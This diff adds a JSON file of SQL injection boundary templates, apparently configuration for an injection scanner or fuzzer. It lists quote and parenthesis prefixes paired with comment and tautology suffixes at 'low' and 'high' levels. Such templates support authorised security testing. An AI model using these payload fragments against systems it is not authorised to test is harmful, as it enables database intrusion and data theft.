@@ -1,0 +1,78 @@
+{
+ "low": [
+  {
+   "prefix": "'",
+   "suffix": "--+[RANDSTR]"
+  },
+  {
+   "prefix": "'",
+   "suffix": "#[RANDSTR]"
+  },
+  {
+   "prefix": " ",
+   "suffix": "--+[RANDSTR]"
+  },
+  {
+   "prefix": " ",
+   "suffix": ""
+  },
+  {
+   "prefix": "'",
+   "suffix": "and'[RANDNUM]'='[RANDNUM]"
+  },
+  {
+   "prefix": "')",
+   "suffix": "#[RANDSTR]"
+  },
+  {
+   "prefix": "')",
+   "suffix": "--+[RANDSTR]"
+  },
+  {
+   "prefix": "')",
+   "suffix": "and('[RANDNUM]'='[RANDNUM]"
+  },
+  {
+   "prefix": "\"",
+   "suffix": "\"[RANDNUM]\"=\"[RANDNUM]"
+  },
+  {
+   "prefix": "\"",
+   "suffix": "#[RANDSTR]"
+  }
+ ],
+ "high": [
+    {
+    "prefix": "'",
+    "suffix": "--+[RANDSTR]"
+    },
+    {
+    "prefix": "'",
+    "suffix": "#[RANDSTR]"
+    },
+    {
+    "prefix": " ",
+    "suffix": "--+[RANDSTR]"
+    },
+    {
+    "prefix": " ",
+    "suffix": ""
+    },
+    {
+    "prefix": "'",
+    "suffix": "and'[RANDNUM]'='[RANDNUM]"
+    },
+    {
+    "prefix": "')",
+    "suffix": "#[RANDSTR]"
+    },
+    {
+    "prefix": "')",
+    "suffix": "--+[RANDSTR]"
+    },
+    {
+    "prefix": "')",
+    "suffix": "and('[RANDNUM]'='[RANDNUM]"
+    }
+ ]
+}
